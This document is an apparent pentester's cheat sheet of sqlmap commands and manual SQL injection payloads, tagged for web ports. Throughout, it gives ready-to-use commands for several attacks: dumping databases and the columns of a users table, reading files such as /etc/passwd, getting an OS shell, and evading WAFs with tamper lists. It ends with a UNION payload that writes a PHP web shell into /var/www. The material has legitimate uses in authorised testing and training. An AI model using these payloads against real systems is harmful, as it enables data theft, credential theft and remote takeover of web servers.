# SQLMAP

% sql injection
#plateform/linux #target/remote #cat/ATTACK/INJECTION  #port/80 #port/443 #port/8080 #port/8443

## basic sqlmap step 1
```
sqlmap -u <url> -p <parameter> --dbs
```

## basic sqlmap step 2
```
sqlmap -u <url> -p <parameter>
```

## basic sqlmap step 3
```
sqlmap -u <url> -p <parameter> -D <database_name> --tables
```

## basic sqlmap step 4
```
sqlmap -u <url> -p <parameter> -D <database_name> -T <tables> --columns
```

## basic sqlmap step 5
```
sqlmap -u <url> -p <parameter> -D <database_name> -T <tables> -C <columns> --dump
```

## sqlmap - list dbs
```
sqlmap -u <url> --dbs
```

## sqlmap - list tables
```
sqlmap -u <url> -D <db> --tables
```

## sqlmap - dump a table
```
sqlmap -u <url> -D <db> -T <table> --dump
```

## sqlmap - list columns of a table
```
sqlmap -u <url> -D <db> -T <table> --columns
```

## sqlmap - dump only some tables columns
```
sqlmap -u <url> -D <db> -T <table> -C <c1>,<c2> --dump
```

## sqlmap - get shell
```
sqlmap -u <url> --os-shell
```

## sqlmap - file read
```
sqlmap -u <url> --file-read=<remote_file>
```

## sqlmap - file write
```
sqlmap -u <url> --file-write=<local_file> --file-dest=<remote_path_destination>
```

## sqlmap - classic get
```
sqlmap -u <url>
```

## sqlmap - classic post
```
sqlmap -u <url> -d "<params>"
```

## sqlmap - get with cookie
```
sqlmap -u <url> --cookie=<cookie>
```

## sqlmap - use file
```
sqlmap -r <request_file>
```

## sqlmap - classic with tamper
```
sqlmap -u '<url>' tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

## sqlmap - hardcore
```
sqlmap -u '<url>' --level=5 --risk=3 -p '<parameter>' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```

## sqlmap - mysql tamper list
```
sqlmap -u <url> --dbms=MYSQL tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

## sqlmap - mssql tamper list
```
sqlmap -u <url> --dbms=MSSQL tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```


# SQLI Manually

## SQLI Manually - Dump the content of table into the filesystem
```
')) union select <column1>,<column2> from <table name> into outfile "<url to file>" --+
```

## SQLI Manually - find the number of columns
```
order by 9 -- -
```

## SQLI Manually - Find space to output db
```
union select 1,2,3,4,5,6,7,8,9 -- -
```

## SQLI Manually - Get all tables
```
union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables -- -
```

## SQLI Manually - Get all columns from a specific table
```
union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users' -- -
```

## SQLI Manually - Get content from the users-table. From columns name and password
```
union select 1,2,3,4,concat(name,0x3a,password),6,7,8,9 FROM users
```

## SQLI Manually - read file
```
union select 1,2,3,4, load_file('/etc/passwd') ,6,7,8,9 -- -
union select 1,2,3,4, load_file('/var/www/login.php') ,6,7,8,9 -- -
```

## SQLI Manually - create a file and call it to check if really created
```
union select 1,2,3,4,'this is a test message' ,6,7,8,9 into outfile '/var/www/test' -- -
union select 1,2,3,4, load_file('/var/www/test') ,6,7,8,9 -- -
```

## SQLI Manually - create a file to get a shell
```
union select null,null,null,null,'<?php system($_GET[‘cmd’]) ?>' ,6,7,8,9 into outfile '/var/www/shell.php' -- -
union select null,null,null,null, load_file('/var/www/shell.php') ,6,7,8,9 -- -
```